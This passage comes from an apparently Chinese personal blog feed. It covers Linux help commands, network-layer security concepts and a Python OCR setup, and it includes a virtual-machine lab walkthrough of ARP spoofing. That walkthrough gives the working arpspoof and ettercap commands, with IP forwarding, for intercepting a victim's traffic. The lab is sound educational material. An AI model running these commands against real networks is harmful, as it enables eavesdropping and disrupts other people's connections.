5月 18 02:15 /usr/bin/python -&gt; python3</span><br></pre></td></tr></table></figure><h3 id="使用演示">使用演示</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [10:09:17]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">which</span> <span class="built_in">cat</span></span></span><br><span class="line">/usr/bin/cat</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [10:09:58]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">which</span> <span class="built_in">read</span></span></span><br><span class="line">read: shell built-in command</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [10:10:03]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">which</span> <span class="keyword">for</span></span></span><br><span class="line">for: shell reserved word</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [10:10:09]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">which</span> demoFun</span></span><br><span class="line">demoFun () &#123;</span><br><span class="line">        echo &quot;这是我的第一个 shell 函数!&quot;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">violetv at manjaro <span class="keyword">in</span> ~ [10:10:17]</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">which</span> ll</span></span><br><span class="line">ll: aliased to ls -lh</span><br></pre></td></tr></table></figure><h2 id="whereis">whereis</h2><p>通过 <code>man whereis</code> 我们发现 Description中有这样两句话：</p><blockquote><p>whereis locates the binary, source and manual files for the specifiedcommand names.</p></blockquote><blockquote><p>whereis then attempts to locate the desired program in the standardLinux places, and in the places specified by $PATH and $MANPATH.</p></blockquote><p><code>whereis</code> 通过搜索<code>the standard Linux places</code>、<code>$PATH</code> 和<code>$MANPATH</code> 列出的位置来进行定位，主要定位三类文件:<code>binary, source and manual files</code>。</p><p>两个使用场景:</p><ol type="1"><li>安装了多个版本的 python 之类的，看一下安装了哪些具体的版本号</li><li>查看 python 库文件位置，例如: <code>usr/lib/python3.8</code>之类的</li></ol><h2 id="man">man</h2><blockquote><p>Man pages are the UNIX traditional way of distributing documentationabout programs. The term "man page" itself is short for "manual page",as they correspond to the pages of the printed manual; the man pages"sections" (1 for commands, 2 for system calls, etc.) correspond tosections in the full UNIX manual.</p></blockquote><p>在 man 的帮助手册中，将帮助文档分为了 9个类别，对于有的关键字可能存在多个类别中，我们就需要指定特定的类别来查看；（一般我们查询 bash 命令，归类在 1类中）；</p><p>man 页面所属的分类标识(常用的是分类 1 和分类 3)</p><p>(1)、用户可以操作的命令或者是可执行文件(2)、系统核心可调用的函数与工具等 (3)、一些常用的函数与数据库(4)、设备文件的说明 (5)、设置文件或者某些文件的格式 (6)、游戏(7)、惯例与协议等。例如 Linux 标准文件系统、网络协议、ASCⅡ，码等说明内容(8)、系统管理员可用的管理条令 (9)、与内核有关的文件</p><p>通过 <code>man man</code> 我们发现：</p><blockquote><p>The table below shows the section numbers of the manual followed bythe types of pages they contain.</p><p>1 Executable programs or shell commands（可执行程序或 shell 命令） 2System calls (functions provided by the kernel)(程序接口内核系统调用) 3Library calls (functions within program libraries)(C 库函数程序接口) 4Special files (usually found in /dev)(特殊文件，比如说驱动程序和设备文件/dev/null， /dev/zero 之类的) 5 File formats and conventions, e.g./etc/passwd (文件格式) 6 Games(游戏娱乐，如屏幕保护程序) 7 Miscellaneous(including macro package and conventions), e.g. man(7), groff(7)(杂项) 8System administration commands (usually only for root)(系统管理员命令) 9Kernel routines <code>[Non standard]</code> (内核惯例)</p></blockquote><h3 id="指定类别">指定类别</h3><p>当我们需要指定特定的类别来查看， 命令:<code>man [1-8] program</code>。</p><p>例如直接 <code>man printf</code>它会默认显示第一个存在该命令的类别，因此显示的是第一个类别 shell命令中的 printf。如果你希望查看 c 语言的 printf 帮助，则需要<code>man 3 printf</code></p><p>一般我们可以通过 <code>whatis</code> 查看命令都处在哪些类别，然后通过<code>man</code> 指定类别详细看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">whatis <span class="built_in">printf</span></span></span><br><span class="line">printf (3)           - formatted output conversion</span><br><span class="line">printf (3p)          - print formatted output</span><br><span class="line">printf (1p)          - write formatted output</span><br><span class="line">printf (1)           - format and print data</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">man 3 <span class="built_in">printf</span></span></span><br></pre></td></tr></table></figure><p>适用场景：第一次学习使用某个命令，因为内容比较详细。</p><h2 id="info">info</h2><p>In the early '90s, the GNU project decided that "man" documentationsystem was outdated, and wrote the info command to replace it: info hasbasic hyperlinking features and a simpler markup language to use(compared to the "troff" system used for man pages). In addition, GNUadvocates against the use of man pages at all and contends that complexsoftware systems should have complete and comprehensive documentationrather than just a set of short man pages.</p><p>适用场景：第一次学习使用某个命令，因为内容比 man 还详细。</p><h3 id="man-vs-info">man vs info</h3><p>They are two different documentation systems. There are actuallyother documentation systems in use, besides man and info: GNOME and KDEhave their own, HTML-based system, etc.</p><p>Differences</p><ul><li><p>Keybinding man uses less to display the manual page which in turnuses vim keybindings while info uses emacs keybindings and standardemacs commands for search, quitting etc.</p></li><li><p>Period</p><p>Info is the default format for documentation inside the GNU project,man is the much older traditional format for UNIX.</p></li><li><p>Format</p><p>Info uses Texinfo as its source format, which is a bunch of macrosfor TeX, and that makes it much easier to also create "good-looking"printed versions or PDFs. Generally, man pages are more about 1 specifictopic (a command, a config file, a system function, ...) while infonormally has more the structure of a combined manual, more like abook.</p><p>Man is giving complete command options and descriptions. info commandalso similar to man but info command listing structured level. We caneasily read and understand the command options</p></li><li><p>Content</p><p>The main difference between Man and Info is the amount of contentthat they have; Info contains a whole lot more than Man does.</p></li><li><p>Which one？</p><p>Some people like Info because they can get a lot more from it whileothers like Man because it is straight to the point and they can quicklyget what they want without wasting time.</p></li></ul><h2 id="help-选项"><code>--help</code> 选项</h2><p><code>--help</code>选项并不是所有命令都有的，不过，根据我使用的经验来看，大部分外部命令都是有的。它显示的信息比<code>man</code> 精简一些</p><p>适用场景： 学过该命令，但是忘了某个选项，此时，使用<code>--help</code> 简洁明了。</p><h2 id="参考资料">参考资料</h2><p><ahref="https://linuxtools-rst.readthedocs.io/zh_CN/latest/base/01_use_man.html">1.学会使用命令帮助</a> <ahref="https://superuser.com/questions/40301/which-whereis-differences">which/whereisdifferences</a> <ahref="https://linuxize.com/post/linux-type-command/">Linux TypeCommand</a> <ahref="https://askubuntu.com/questions/9325/what-is-the-difference-between-man-and-info-documentation">Whatis the difference between “man” and “info” documentation?</a> <ahref="https://unix.stackexchange.com/questions/19451/difference-between-help-info-and-man-command">Differencebetween help, info and man command</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARP 欺骗</title>
      <link href="/blog/2020/07/17/network/arp_spoofing/"/>
      <url>/blog/2020/07/17/network/arp_spoofing/</url>
      
        <content type="html"><![CDATA[<p>ARP 协议的有效性基于这样一个前提: 即：网络上的节点是诚实的，节点不会响应与其不相关的 ARP 请求，节点也不会发送不正确的 IP-MAC 映射的 ARP 响应。但实际上并不是这样。</p><h2 id="简介">简介</h2><p>无论节点收到 ARP 请求还是响应，该节点均会更新其 ARP表。若无对应表项，则添加该表项; 反之，则更新对应的表项。</p><p>ARP spoofing 攻击：攻击者通过发送不正确的 IP-MAC 映射信息，结果导致局域网内被攻击主机发送给网关的流量信息实际上都发送给攻击者，这样就会造成窃听以及中间人攻击。</p><p>欺骗方式：</p><ol type="1"><li><p>欺骗主机作为“中间人”，定期发送 ARP响应，被欺骗主机的数据都经过它中转一次，这样欺骗主机可以窃取到被它欺骗的主机之间的通讯数据；</p></li><li><p>让被欺骗主机直接断网。 通过 <code>arpspoofing</code>对受害者主机进行 arp欺骗到自己或者别的主机，但是不转发受害者主机发送来的流量，因此，实现断网的效果。</p></li></ol><p>解决方案：</p><ol type="1"><li>由网关等设备或者软件定期发送正确的 ARP 信息（没啥用）</li><li>静态绑定 ARP 条目，在网关和 PC 上双向绑定</li><li>DAI（彻底解决）</li></ol><p>ARP 欺骗的双向性：</p><p>ARP 本质是重定向，即通过欺骗性的 MAC - IP映射将数据引导到某个节点，而重定向不一定是一种攻击。例如：使用两台服务器提供网络服务，其中一台作为备用机器。当主务器失败时，可以通过ARP 欺骗将数据包定向到备份服务器，实现用户透明的切换。</p><h2 id="实战">实战</h2><h3 id="实验环境">实验环境</h3><h3id="本实验在虚拟机中完成实际效果与真实主机效果无异">本实验在虚拟机中完成（实际效果与真实主机效果无异）</h3><ol type="1"><li><p>实验要求：两个主机的网络必须同在一个局域网内，否则无法实现。Manjaro Linux 系统主机一台（受害者的主机）, IP: 10.252.254.241/21 Kali系统主机一台（虚拟机，攻击者的主机）, IP: 10.252.252.250/21 网关IP：10.252.248.1/21</p></li><li><p>攻击者主机开启流量转发</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure></p><p>参考 <ahref="https://linuxconfig.org/how-to-turn-on-off-ip-forwarding-in-linux">Howto Disable/Enable IP forwarding in Linux</a></p></li></ol><h3 id="工具使用">工具使用</h3><p>工具要求： <code>fping</code>， <code>arpspoofing</code>,<code>ettercap</code></p><ol type="1"><li><p><code>fping</code> 扫描查看内网在线主机</p><p><code>fping -asg 网关地址/子网掩码</code>具体命令含义可以见我的博客链接： - [ ] blog link</p></li><li><p><code>arpspoof</code> 进行 ARP 欺骗 arch linux 安装<code>sudo pacman -S dsniff</code> 查看使用办法 arpspoof -h Usage:arpspoof [-i interface][-c own|host|both] [-t target][-r] host 对应：<code>arpspoof -i 网卡 -t 目标Ip 网关</code></p><p>攻击者向受害者主机发送的 ARP 响应，伪造网关 IP 为源 IP,自己（攻击者的主机）的，MAC 地址为源 MAC地址。这样受害者主机在访问网络时，就会误将攻击者作为网关，从而将数据帧转发到攻击者。此时如果攻击者不进行任何其他操作，受害者主机就会处于断网状态；如果攻击者转发查看流量包，就可以进行监听或者中间人攻击了。</p></li><li><p><code>ettercap</code> 嗅探流量，中间人攻击<code>sudo ettercap -Tq -i 网卡</code></p></li></ol><h3 id="演示">演示</h3><ol type="1"><li>kali 作为攻击者，首先进行 arp 欺骗攻击命令：<code>arpspoof -i eth0 -t 10.252.254.241 10.252.248.1</code></li><li>然后我们发现被攻击者连不上网了</li><li>kali 攻击者，再打开 <code>ettercap</code> 进行嗅探转发，命令：<code>ettercap -Tq -i eth0</code></li><li>受害者可以上网，攻击者捕获受害者的所有数据包。</li></ol><h2 id="实验过程遇到的问题">实验过程遇到的问题</h2><ol type="1"><li>arch linux 源的 <code>ettercap</code> 包本身有问题</li><li>新版 kali 的变化 默认非 root 用户， 普通用户名密码均变为了<code>kali</code>，导致很多工具在普通用户权限下运行，<strong>直接显示命令不存在</strong>，只有拥有 root 权限时才能使用。</li><li><code>arpspoof</code> 命令存在于 <code>dsniff</code> 包中</li></ol><h2 id="参考资料">参考资料</h2><blockquote><ol type="1"><li><ahref="https://blog.csdn.net/qq_33936481/article/details/51286486">ARP断网攻击和欺骗实现 kali</a></li><li><ahref="https://security.stackexchange.com/questions/189203/unable-to-locate-package-arpspoof">unableto locate package Arpspoof [closed]</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> network </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>数据链路层</title>
      <link href="/blog/2020/07/17/network/link/"/>
      <url>/blog/2020/07/17/network/link/</url>
      
        <content type="html"><![CDATA[<h2 id="简介">简介</h2><p>数据链路层（Data Link Layer）是 OSI模型的第二层，负责建立和管理节点间的链路。该层的主要功能是：通过各种控制协议，将有差错的物理信道变为无差错的、能可靠传输数据帧的数据链路。</p><p>在计算机网络中由于各种干扰的存在，物理链路是不可靠的。因此，这一层的主要功能是在物理层提供的比特流的基础上，通过差错控制、流量控制方法，使有差错的物理线路变为无差错的数据链路，即提供可靠的通过物理介质传输数据的方法。</p><p>数据链路层的具体工作是接收来自物理层的位流形式的数据，并封装成帧，传送到上一层；同样，也将来自上层的数据帧，拆装为位流形式的数据转发到物理层；并且，还负责处理接收端发回的确认帧的信息，以便提供可靠的数据传输。</p><p>数据链路层的协议数据单元(Protocol Data Unit)为数据帧。</p><h2 id="常用设备">常用设备</h2><p>以太网采用星型拓扑结构，使用集线器（hub）或（switch）连接网络节点。</p><p>早期采用集线器，集线器是一种物理层设备，其上只有比特的概念，而无帧的概念。集线器的主要功能是对接收到的信号进行再生整形放大，以扩大网络的传输距离，简而言之，就是接受信号，广播信号。因此，任何节点都可以通过把网卡设置为混杂模式（promiscuousmode）进行窃听。</p><p>21世纪以后，集线器逐渐被交换机替代。交换机以帧的概念进行工作。根据交换机表来决定将到达的帧发送到那个端口，而不是广播接受到的帧。交换机表包括三个字段：节点的MAC 地址，该 MAC 地址对应的端口，该表项在表中的时间。</p><p>对于两种情况，交换机会采用广播方式发送数据：</p><ol type="1"><li>如果帧的目的 MAC 地址为广播地址 FF-FF-FF-FF-FF-FF</li><li>如果帧的目的 MAC 地址在交换表中查不到的表项</li></ol><h2 id="常见协议">常见协议</h2><ol type="1"><li>4 种 VPN 隧道协议中的两种<ol type="1"><li>点到点隧道协议 PPTP(The Point-to-Point Tunneling Protocol)</li><li>第二层隧道协议 L2TP(Layer Two Tunneling Protocol)</li></ol></li><li>ARP/RARP（地址解析协议/反向地址解析协议）</li></ol><h2 id="参考资料">参考资料</h2><p><a href="https://www.e365.info/?p=48621">34.数据链路层</a></p>]]></content>
      
      
      <categories>
          
          <category> network </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网络层</title>
      <link href="/blog/2020/07/17/network/network/"/>
      <url>/blog/2020/07/17/network/network/</url>
      
        <content type="html"><![CDATA[<h2 id="ip-address-spoofing">IP Address Spoofing</h2><p>根据 IP 协议， 路由器只是根据 IP 分组的目的 IP 地址来确定该 IP分组从哪一个端口发送的，而不关心该 IP 分组的源 IP地址。基于该原理，任意节点均可以构造 IP 分组。</p><p>IP 欺骗攻击主要用于两种网络攻击方式: 拒绝服务攻击和基于 IP地址认证的网络服务中。</p><h3 id="实现">实现</h3><ol type="1"><li>scapy（依赖于 tcpdump）工具或者 Python 的 scapy 模块，轻易地伪造 IP<a href="https://www.jianshu.com/p/cc7fa0d64c15">利用 Linux scapy伪造数据包攻击</a><ul class="task-list"><li><label><input type="checkbox" />scapy 学习</label></li></ul></li><li>可以直接自己通过 raw socket 编程进行伪造 IP。</li></ol><h3 id="合法用途">合法用途</h3><p>使用具有错误源 IP地址的数据包并不总是用于恶意企图。例如，在网站性能测试，成百上千的“用户”（虚拟用户）可能被创建，每个都在执行测试网站的测试脚本，以模拟当系统上线和大量用户立刻登录时会发生什么事。</p><p>由于每个用户都会有自己的 IP 地址，商业测试产品（如 HPLoadRunner、WebLOAD 等）可以使用 IP欺骗，同样允许每个用户自己的“返回地址”。</p><ul class="task-list"><li><label><input type="checkbox" />未完待续</label></li></ul><h2 id="参考资料">参考资料</h2><p><ahref="https://zh.wikipedia.org/wiki/IP%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97#%E5%BA%94%E7%94%A8">IP地址欺骗</a></p><p><ahref="http://www.cis.syr.edu/~wedu/seed/Labs_16.04/Networking/Sniffing_Spoofing/Sniffing_Spoofing.pdf">PacketSniffing and Spoofing Lab</a></p>]]></content>
      
      
      <categories>
          
          <category> network </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>OSI 7 层模型及其安全隐患</title>
      <link href="/blog/2020/07/17/network/osi_layer/"/>
      <url>/blog/2020/07/17/network/osi_layer/</url>
      
        <content type="html"><![CDATA[<p>ICMP 是网络层，目前 VPN 隧道协议主要有 4 种：点到点隧道协议PPTP、第二层隧道协议 L2TP、网络层隧道协议 IPSec 以及 SOCKS v5协议。其中，PPTP 和 L2TP 工作在数据链路层，IPSec 工作在网络层，SOCK v5工作在会话层</p><p>ARP 和 RARP是网络层的协议，但是它所工作的内容是链路层的。具体来说应该是在网络层。</p><h3 id="应用层">7. 应用层</h3><h3 id="dns">DNS</h3><p>DNS 递归查询</p><pre><code>DNS 客户端与本地 DNS 服务器在DNS递归名称解析中，当所配置的本地名称服务器解析不了时，后面的查询工作是由本地名称服务器替代DNS客户端进行的（以“本地名称服务器”为中心），只需要本地名称服务器向DNS客户端返回最终的查询结果即可。</code></pre><p>DNS 迭代查询</p><pre><code>所有查询工作全部是DNS客户端自己进行（以“DNS客户端”自己为中心）。</code></pre><ol type="1"><li><p>DNS 劫持</p><ol type="1"><li><p>DNS 缓存毒化（DNS cache poisoning）</p></li><li><p>DNS ID 欺骗（DNS ID spoofing）</p></li></ol></li></ol><p>基于 DNS 的 DDos 攻击</p><h4 id="http">HTTP</h4><p>钓鱼攻击</p><pre><code>HTTP 协议没有考虑用户认证解决：使用 HTTPS</code></pre><ul class="task-list"><li><label><input type="checkbox" />XSS 跨站脚本攻击</label></li></ul><p>服务器过滤不足：</p><pre><code>反射性存储性</code></pre><p>客户端脚本：</p><pre><code>DOM 型</code></pre><h4 id="电子邮件">电子邮件</h4><p>传输安全，存储安全，发送者身份确认安全，邮箱轰炸。</p><ul class="task-list"><li><label><input type="checkbox" />浏览器解析标签的原理</label></li></ul><h3 id="表示层">6. 表示层</h3><h3 id="会话层">5. 会话层</h3><h3 id="传输层">4. 传输层</h3><h4 id="tcp-协议">TCP 协议</h4><p>特点： 全双工，面向连接，可靠性，面向字节流。</p><ul class="task-list"><li><label><input type="checkbox" />虚电路</label></li></ul><ol type="1"><li><p>SYN flooding 攻击 --&gt; 拒绝服务攻击</p><p>解决方法： SYN cookie 解决 “半连接拒绝服务攻击”，但是对于 “全连接”拒绝服务攻击是无效的。</p></li><li><p>ACK flooding 攻击</p><p>服务器收到 ACK 包后，需要进行查表、回应 ACK，RST。 利用大流量 ACK小包才会对服务器造成影响。</p><p>一些 TCP 服务会对 ACK Folooding 比较敏感。</p><p>解决方法： 对称型分析： 收包异常大于发包</p></li><li><p>序列号预测攻击</p><p>在一个 TCP 连接中， TCP端口号和序列号是判断数据包是否为所需数据包的主要依据。由于一旦建立连接之后，端口号是不变的，因此攻击的难点就在于序列号预测。</p></li><li><p>LAND 攻击</p><p>LAND（Local Area Network Denial），攻击者构造一种特殊的 TCP SYN攻击包，该包的目的地址和源地址均为目的主机，这样被攻击主机有发回给自己ACK消息，保持连接，直到超时，创建一个空连接，导致目的主机连续地自我响应。</p><p>新系统已经基本消除。</p></li></ol><h4 id="udp">UDP</h4><p>特点： 无连接，不可靠，不保序</p><ol type="1"><li><p>UDP 假冒 （UDP spoofing）</p><p>本质上是 IP 假冒攻击，即: 攻击者可以构造 UDP数据包，其源地址为某个可信节点的地址。</p></li><li><p>UDP 劫持（UDP hijack）</p><p>可信客户端发起 UDP 请求后，攻击者假冒服务器发出 UDP 应答。</p></li></ol><h3 id="网络层">3. 网络层</h3><p>IP 层协议</p><p>IP 假冒攻击(IP spoofing) 利用路由器只根据目的 IP来确定分组转发到那个端口，而不关心源 IP 来实现。 IP假冒攻击主要用于两种网络攻击： 拒绝服务攻击与基于 IP地址认证的网络服务。</p><p>解决：</p><ol type="1"><li>入口/出口过滤</li><li>IP 回溯技术</li></ol><h3 id="链路层">2. 链路层</h3><p>以太网协议</p><ol type="1"><li><p>交换机毒化 --&gt; 窃听</p><p>交换机与集线器都是连接网络节点。</p></li><li><p>arp 欺骗/毒化 --&gt; 窃听，中间人攻击</p><p><ahref="https://www.jianshu.com/p/e7c02c841eaa">网络适配器（网卡）</a>针对网关的攻击</p><p>arp 欺骗实现当主务器失败时，用户透明的切换至备份服务器。</p></li></ol><h3 id="物理层">1. 物理层</h3><p>集线器工作于 OSI/RM 参考模型的物理层和数据链路层的MAC（介质访问控制）子层</p><p>集线器 --早期使用其链接网络节点，因其一个节点发送时，其余节点只能监听，否则会产生冲突，导致重传，因此目前很少使用了它，大都用二层交换机了。</p><ol type="1"><li>集线器窃听</li></ol>]]></content>
      
      
      <categories>
          
          <category> network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> osi_sec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 下使用 Python OCR 识别</title>
      <link href="/blog/2020/07/13/utilities/pylinux_ocr/"/>
      <url>/blog/2020/07/13/utilities/pylinux_ocr/</url>
      
        <content type="html"><![CDATA[<h2 id="preparation">Preparation</h2><h3 id="notice">Notice</h3><blockquote><p>manjaro kde 用户直接看下面的安装总结，一把梭哈。</p></blockquote><h3 id="screenshot-tools">screenshot tools</h3><p>Spectacle 为 KDE桌面自带的官方屏幕截图工具，功能强大，使用舒适，推荐使用哦。 本来想通过flameshot的命令行来实现截图并存储到指定位置的，然而它的命令行不能够截取部分区域，只能截取整个桌面或者屏幕。</p><p>我知道的其他可以使用截图工具的有： scot、gnome-screenshot</p><p>参考命令(截取指定矩形，并存储到指定位置):</p><p><code>scrot -s -o ~/Documents/temp.png</code>、<code>gnome-screenshot -a -f ~/Documents/temp.png</code></p><p>注：个人认为 spectacle 比 scrot 截图可视化做得好，即：截取区域时，可以明显看见，而且截取完了，可以再改变或者与移动区域。</p><h3 id="tesseract-ocr">tesseract-ocr</h3><h3 id="introduction">Introduction</h3><p>tesseract 是一款被广泛使用的开源 OCR 工具，在现在的免费 OCR引擎中，其识别精度类较好的，也广泛被使用。tesseract 作为开源项目发布在GitHub 上，其最新版本已经支持中文 OCR，并提供了命令行工具，此外，还有Python 库 <code>pytesseract</code>。</p><p><a href="https://github.com/tesseract-ocr/tesseract">tesseractGithub</a></p><h4 id="installation">Installation</h4><p>各发行版 Linux 一般对应仓库都有包，我使用的是Manjaro，得益于其强大的社区以及用户仓库，安装软件一句命令行搞定。</p><ol type="1"><li><p>安装 Tesseract <code>sudo pacman -S tesseract</code></p></li><li><p>安装语言文件</p><ol type="1"><li><p>方法一：<code>sudo pacman -S tesseract-data-chi_sim tesseract-data-eng</code></p></li><li><p>方法二： 直接在 <ahref="https://github.com/tesseract-ocr/tessdata">Github tessdata</a>下载，然后将其移动到 tessdata 对应位置即可。 manjaro linux 的位置是<code>/usr/share/tessdata/</code>， 其他 Debian based Linux 可能是<code>/usr/share/tesseract-ocr/tessdata</code>。</p></li></ol></li><li><p>检查是否安装好</p></li></ol><p>该命令显示出安装过的语言数据包（我多安装了两个）。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tesseract --list-langs</span></span><br><span class="line">List of available languages (4):</span><br><span class="line">chi_sim</span><br><span class="line">chi_sim_vert</span><br><span class="line">eng</span><br><span class="line">osd</span><br></pre></td></tr></table></figure><h3 id="baidu-ocr">Baidu OCR</h3><h4 id="introduction-1">Introduction</h4><p>我使用的是百度 OCR 的 SDK（为啥没直接 API，额，第一眼看到了SDK，就用了 emm）。后面才发现 SDK不太适合对含位置信息版的接口进行二次处理，扩展功能，等有空再搞吧。</p><h4 id="installation-1">Installation</h4><ol type="1"><li><code>pip install baidu-aip</code></li><li>申请 API 接口 后面填到脚本对应位置。 申请教程参考：<ahref="https://blog.csdn.net/biao197/article/details/102907492">如何申请百度文字识别apikey 和 Secret Key</a></li></ol><h3 id="其他-python-第三方库">其他 Python 第三方库</h3><ol type="1"><li><p>pytesseract 调用 tesseract：<code>pip install pytesseract</code></p></li><li><p>pyperclip 处理剪切板中纯文本与 Python 的交互：<code>pip install pyperclip</code> 依赖 <code>xclip</code> 或者<code>xsel</code>， 安装命令：<code>sudo pacman -S xclip</code></p></li></ol><p>pillow 处理图片： <code>pip install pillow</code></p><h3 id="安装总结">安装总结</h3><ol type="1"><li><p>安装</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S xclip tesseract tesseract-data-chi_sim tesseract-data-eng</span><br><span class="line">pip install baidu-aip pytesseract pyperclip</span><br></pre></td></tr></table></figure></p></li><li><p>去百度智能云创建文字识别应用，并获取该应用三个信息 详细步骤见 <ahref="https://blog.csdn.net/biao197/article/details/102907492">如何申请百度文字识别apikey 和 Secret Key</a><code>APP_ID、API_KEY、SECRET_KEY</code></p></li></ol><h2 id="脚本编写">脚本编写</h2><h3 id="脚本思路">脚本思路</h3><ol type="1"><li><p>利用截图软件 spectacle 截取需要被文字识别的部分；</p></li><li><p>利用百度 OCR 或者文字识别 OCR 软件 tesseract 进行识别参数控制有无网络，使得有网络用百度， 无网络用 tesseract</p></li><li><p>将结果输出至剪切板参数控制是否需要段落整理（在你识别段落文字时，很重要，不处理的话，换行之类的格式较乱），通过正则进行段落整理。</p></li></ol><h3 id="学习历程">学习历程</h3><ol start="0" type="1"><li><p>查阅学习 spectacle <code>spectacle --help</code></p></li><li><p>查阅学习 tesseract 基本命令；<code>tesseract --help-extra</code></p></li><li><p>查阅学习 百度 OCR SDK 文档，并学习 baidu-aip 模块基本使用 <ahref="https://cloud.baidu.com/doc/OCR/s/Ek3h7yeiq">baidu OCR SDK Python文档</a></p></li><li><p>学习 pytesseract、pyperclip、pillow 模块基本使用</p></li><li><p>学习 Python 调用 shell 命令</p></li></ol><h2 id="python-代码">Python 代码</h2><p><ahref="https://github.com/violetu/mybackup/blob/master/useful_scripts/spectacle_ocr.py">脚本spectacle_ocr.py</a></p><p>注意：</p><ol type="1"><li>将临时路径 TEMP_IMG_PATH 自己设置一个。</li><li>在脚本中搜索 "Notice"，找到百度 API信息的位置，补充之前你创建的百度文字识别应用的信息：<code>APP_ID、API_KEY、SECRET_KEY</code></li></ol><h2 id="快捷键设置">快捷键设置</h2><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200711205058.png"alt="快捷键设置" /><figcaption aria-hidden="true">快捷键设置</figcaption></figure><h2 id="问题与改进">问题与改进</h2><h3 id="截图图片作为中间产物">截图图片作为中间产物</h3><p>本脚本使用了外部截图工具截图后放到指定位置，然后从该位置获取图片，这样存储读取速度就慢了些，而且产生了中间产物：一张截图。</p><p>我尝试解决这个问题，发现常用的方法有两种：</p><ol type="1"><li><p>使用 pillow 模块的 <code>ImageGrab.grabclipboard()</code>获取剪切板的截图</p><p>从下面链接可以看出，该方法只是用于 Windows 和 OS X。 <ahref="https://pillow.readthedocs.io/en/3.1.x/reference/ImageGrab.html">ImageGrabModule (OS X and Windows only)</a></p><p>因此，我尝试搜索 ”ImageGrab Linux alternative“ 找到了 <ahref="https://stackoverflow.com/questions/43520757/imagegrab-alternative-in-linux">ImageGrabalternative in linux</a>，也就是： pyscreenshot</p><p>然而， pyscreenshot 并没有 grabclipboard方法，直接获取剪切板图片，而是可以直接截图，这就很高级了。通过搭配python 的 <code>pynput</code>库来监听键盘实现快捷键截图，监听鼠标确定截图区域。</p><p>这样，就直接避免了使用截图工具和产生中间图片的问题，Great！</p><ul class="task-list"><li><label><input type="checkbox" />待改进</label></li></ul></li><li><p>使用 Qt 或者 GTK 图形界面框架来进行截图与获取截图后的图片至Python 对象。</p><p>这当然选 Qt 了，一方面学过 Qt 的一些知识，一方面我用的 KDE 桌面是使用Qt 开发。</p><ul class="task-list"><li><label><input type="checkbox" />图形界面的 OCR 识别</label></li></ul></li></ol><h2 id="参考资料">参考资料</h2><blockquote><ol type="1"><li><ahref="https://stackoverflow.com/questions/51668339/preserving-spaces-in-tesseract">PreservingSpaces in Tesseract</a></li><li><a href="https://pypi.org/project/pytesseract/">pypi pytesseract0.3.4</a></li><li><a href="https://ptorch.com/news/231.html">pypi pytesseract 0.3.4中文翻译</a></li><li><a href="https://stackoverflow.com/questions/4909396/">Is there anyway to improve tesseract OCR with small fonts?</a></li><li><a href="https://ai.baidu.com/ai-doc/OCR/3k3h7yeqa">baidu 文字识别SDK python 接口说明</a></li><li><ahref="https://blog.csdn.net/XnCSD/article/details/80786793">Python利用百度文字识别 API 识别并提取图片中文字</a></li><li><a href="https://github.com/asweigart/pyperclip">pyperclipgithub</a></li><li><a href="https://www.jianshu.com/p/a793c0d960fe">python命名规范</a></li><li><a href="https://www.zhihu.com/question/26232941">使用 OCR 识别扫描PDF 后的多余回车应该如何去除？</a></li><li><a href="https://www.pythonf.cn/read/124275">Python 